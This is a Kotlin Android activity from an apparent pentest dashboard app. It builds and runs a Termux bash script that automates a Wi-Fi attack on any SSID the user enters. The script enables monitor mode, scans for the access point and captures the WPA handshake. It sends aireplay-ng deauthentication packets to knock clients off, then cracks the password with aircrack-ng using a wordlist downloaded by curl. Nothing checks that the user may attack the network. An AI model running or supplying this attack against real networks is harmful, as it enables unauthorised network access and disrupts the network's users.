package com.pentest.dashboard

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ImageView
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import java.io.File

/**
 * WiFi Capture + Crack Activity
 * Automates: Monitor mode → Capture → Deauth → Crack
 */
class WiFiCaptureActivity : AppCompatActivity() {

    private lateinit var outputText: TextView
    private lateinit var outputScroll: ScrollView
    private lateinit var btnStartCapture: MaterialButton
    private lateinit var btnStop: MaterialButton
    private lateinit var btnConfigure: MaterialButton

    private var attackParams: Map<String, String>? = null
    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_wifi_capture)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        outputText = findViewById(R.id.outputText)
        outputScroll = findViewById(R.id.outputScroll)
        btnStartCapture = findViewById(R.id.btnStartCapture)
        btnStop = findViewById(R.id.btnStop)
        btnConfigure = findViewById(R.id.btnConfigure)

        btnStop.isEnabled = false
        btnStartCapture.isEnabled = false
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener {
            ProcessManager.stopCurrentProcess(this)
            finish()
        }

        btnConfigure.setOnClickListener {
            showParameterDialog()
        }

        btnStartCapture.setOnClickListener {
            attackParams?.let { startAutomatedAttack(it) }
        }

        btnStop.setOnClickListener {
            stopCurrentProcess()
        }
    }

    private fun showParameterDialog() {
        val parameters = listOf(
            ParameterDialog.Parameter(
                "SSID",
                "Target SSID",
                "WiFi network name to attack",
                required = true
            ),
            ParameterDialog.Parameter(
                "BSSID",
                "Target BSSID",
                "MAC address of access point (optional - will scan if empty)",
                required = false
            ),
            ParameterDialog.Parameter(
                "CHANNEL",
                "WiFi Channel",
                "Channel number (1-13, leave empty to auto-detect)",
                required = false
            ),
            ParameterDialog.Parameter(
                "WORDLIST",
                "Wordlist Type",
                "Options: rockyou, common-wifi, top10k, top100k",
                defaultValue = "common-wifi",
                required = true
            ),
            ParameterDialog.Parameter(
                "DEAUTH_COUNT",
                "Deauth Packets",
                "Number of deauth packets (10-100)",
                defaultValue = "20",
                required = true
            )
        )

        ParameterDialog(this).showDialog(
            title = "Configure WiFi Attack",
            parameters = parameters
        ) { values ->
            attackParams = values
            btnStartCapture.isEnabled = true

            addOutput("=== ATTACK CONFIGURED ===")
            addOutput("Target: ${values["SSID"]}")
            values["BSSID"]?.let { if (it.isNotEmpty()) addOutput("BSSID: $it") }
            values["CHANNEL"]?.let { if (it.isNotEmpty()) addOutput("Channel: $it") }
            addOutput("Wordlist: ${values["WORDLIST"]}")
            addOutput("Deauth Count: ${values["DEAUTH_COUNT"]}")
            addOutput("")
            addOutput("Press 'START CAPTURE + CRACK' to begin")
        }
    }

    private fun startAutomatedAttack(params: Map<String, String>) {
        // Note: These WiFi attacks run in TERMUX locally, not on Flipper
        // Root is only needed if running locally. Warn user but allow them to try.
        if (!RootDetection.isDeviceRooted()) {
            android.app.AlertDialog.Builder(this)
                .setTitle("⚠️ Root Recommended")
                .setMessage("This feature runs WiFi attacks locally in Termux and typically requires root access.\n\nIf you have a rooted Termux environment, you can proceed. Otherwise, use the WiFi Deauth feature which runs on Flipper Zero instead.\n\nContinue anyway?")
                .setPositiveButton("Continue") { _, _ ->
                    executeAutomatedAttack(params)
                }
                .setNegativeButton("Cancel", null)
                .show()
            return
        }

        executeAutomatedAttack(params)
    }

    private fun executeAutomatedAttack(params: Map<String, String>) {
        val ssid = params["SSID"] ?: return
        val bssid = params["BSSID"] ?: ""
        val channel = params["CHANNEL"] ?: ""
        val wordlistType = params["WORDLIST"] ?: "common-wifi"
        val deauthCount = params["DEAUTH_COUNT"] ?: "20"

        // Select wordlist URL
        val wordlist = when (wordlistType) {
            "rockyou" -> TermuxIntegration.WiFi.Wordlists.ROCKYOU
            "top10k" -> TermuxIntegration.WiFi.Wordlists.TOP_10K
            "top100k" -> TermuxIntegration.WiFi.Wordlists.TOP_100K
            else -> TermuxIntegration.WiFi.Wordlists.COMMON_WIFI
        }

        btnStartCapture.isEnabled = false
        btnStop.isEnabled = true
        btnConfigure.isEnabled = false

        addOutput("=== STARTING AUTOMATED WiFi ATTACK ===")
        addOutput("This will:")
        addOutput("1. Enable monitor mode")
        addOutput("2. Scan for target (if needed)")
        addOutput("3. Capture WPA handshake")
        addOutput("4. Send deauth packets")
        addOutput("5. Crack password with wordlist")
        addOutput("")

        // Build script with REAL commands
        val script = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== AUTOMATED WiFi CAPTURE + CRACK ==="
            echo "Target SSID: $ssid"
            ${if (bssid.isNotEmpty()) "echo \"Target BSSID: $bssid\"" else ""}
            echo ""

            # Kill interfering processes
            echo "[STEP 1/6] Killing interfering processes..."
            airmon-ng check kill 2>/dev/null || true

            # Enable monitor mode
            echo "[STEP 2/6] Enabling monitor mode on wlan0..."
            airmon-ng start wlan0 2>&1 || { echo "ERROR: Monitor mode failed. Is aircrack-ng installed?"; exit 1; }
            sleep 2

            # Auto-detect BSSID and channel if not provided
            BSSID="$bssid"
            CHANNEL="$channel"

            if [ -z "${'$'}BSSID" ] || [ -z "${'$'}CHANNEL" ]; then
                echo "[STEP 3/6] Scanning for target network '$ssid'..."
                timeout 10 airodump-ng wlan0mon --output-format csv -w /tmp/scan 2>/dev/null &
                SCAN_PID=${'$'}!
                sleep 8
                kill ${'$'}SCAN_PID 2>/dev/null || true

                # Parse scan results
                if [ -f "/tmp/scan-01.csv" ]; then
                    SCAN_RESULT=$(grep -i "$ssid" /tmp/scan-01.csv | head -1)
                    BSSID=$(echo "${'$'}SCAN_RESULT" | cut -d',' -f1 | tr -d ' ')
                    CHANNEL=$(echo "${'$'}SCAN_RESULT" | cut -d',' -f4 | tr -d ' ')
                    rm /tmp/scan-01.csv 2>/dev/null
                    echo "Found: BSSID=${'$'}BSSID, Channel=${'$'}CHANNEL"
                else
                    echo "ERROR: Could not find network '$ssid'"
                    airmon-ng stop wlan0mon
                    exit 1
                fi
            fi

            # Validate we have BSSID and channel
            if [ -z "${'$'}BSSID" ] || [ -z "${'$'}CHANNEL" ]; then
                echo "ERROR: Could not determine BSSID or Channel"
                airmon-ng stop wlan0mon
                exit 1
            fi

            echo "[STEP 4/6] Starting handshake capture on channel ${'$'}CHANNEL..."
            airodump-ng --bssid "${'$'}BSSID" --channel "${'$'}CHANNEL" -w /sdcard/Download/handshake wlan0mon &
            CAPTURE_PID=${'$'}!
            sleep 5

            echo "[STEP 5/6] Sending $deauthCount deauth packets to force handshake..."
            aireplay-ng --deauth $deauthCount -a "${'$'}BSSID" wlan0mon
            sleep 15

            # Stop capture
            echo "[STEP 6/6] Stopping capture..."
            kill ${'$'}CAPTURE_PID 2>/dev/null || true
            sleep 2

            # Check if handshake was captured
            CAP_FILE="/sdcard/Download/handshake-01.cap"
            if [ ! -f "${'$'}CAP_FILE" ]; then
                echo "ERROR: No capture file found!"
                airmon-ng stop wlan0mon
                exit 1
            fi

            echo ""
            echo "=== HANDSHAKE CAPTURED ==="
            echo "File: ${'$'}CAP_FILE"
            echo ""

            # Verify handshake
            echo "Verifying handshake..."
            VERIFY=$(aircrack-ng "${'$'}CAP_FILE" 2>&1 | grep -i "handshake")
            if [ -n "${'$'}VERIFY" ]; then
                echo "✓ WPA handshake detected!"
            else
                echo "⚠ Warning: Handshake may not have been captured"
                echo "You may need to retry with more deauth packets"
            fi

            echo ""
            echo "=== STARTING PASSWORD CRACKING ==="
            echo "Downloading wordlist: $wordlist"
            echo "This may take several minutes..."
            echo ""

            # Crack with online wordlist
            curl -s "$wordlist" | aircrack-ng -w - -b "${'$'}BSSID" "${'$'}CAP_FILE"

            # Restore normal mode
            echo ""
            echo "=== RESTORING WiFi ==="
            airmon-ng stop wlan0mon

            echo ""
            echo "=== ATTACK COMPLETE ==="
            echo "Check output above for cracked password!"
            echo "Look for: KEY FOUND! [ password ]"
        """.trimIndent()

        // Start process
        val processId = ProcessManager.startProcess(this, script)

        // Execute script
        val scriptFile = File(getExternalFilesDir(null), "scripts/script_$processId.sh")
        val termux = TermuxIntegration(this)
        termux.runCommand("bash ${scriptFile.absolutePath}", background = false)

        // Start output monitoring
        startOutputMonitoring()
    }

    private fun startOutputMonitoring() {
        isMonitoring = true

        val monitorRunnable = object : Runnable {
            override fun run() {
                if (!isMonitoring) return

                val outputFile = ProcessManager.getOutputFile(this@WiFiCaptureActivity)
                if (outputFile?.exists() == true) {
                    val output = outputFile.readText()
                    runOnUiThread {
                        outputText.text = output
                        outputScroll.post {
                            outputScroll.fullScroll(ScrollView.FOCUS_DOWN)
                        }
                    }
                }

                // Check if process still running
                if (!ProcessManager.isProcessRunning(this@WiFiCaptureActivity)) {
                    isMonitoring = false
                    runOnUiThread {
                        btnStartCapture.isEnabled = true
                        btnStop.isEnabled = false
                        btnConfigure.isEnabled = true
                        addOutput("")
                        addOutput("=== PROCESS COMPLETE ===")
                    }
                    return
                }

                handler.postDelayed(this, 1000) // Update every second
            }
        }

        handler.post(monitorRunnable)
    }

    private fun stopCurrentProcess() {
        isMonitoring = false
        ProcessManager.stopCurrentProcess(this)

        btnStartCapture.isEnabled = true
        btnStop.isEnabled = false
        btnConfigure.isEnabled = true

        addOutput("")
        addOutput("=== PROCESS STOPPED BY USER ===")
    }

    private fun addOutput(message: String) {
        val current = outputText.text.toString()
        outputText.text = "$current\n$message"
        outputScroll.post {
            outputScroll.fullScroll(ScrollView.FOCUS_DOWN)
        }
    }

    override fun onPause() {
        super.onPause()
        ProcessManager.stopCurrentProcess(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        isMonitoring = false
        ProcessManager.stopCurrentProcess(this)
    }
}
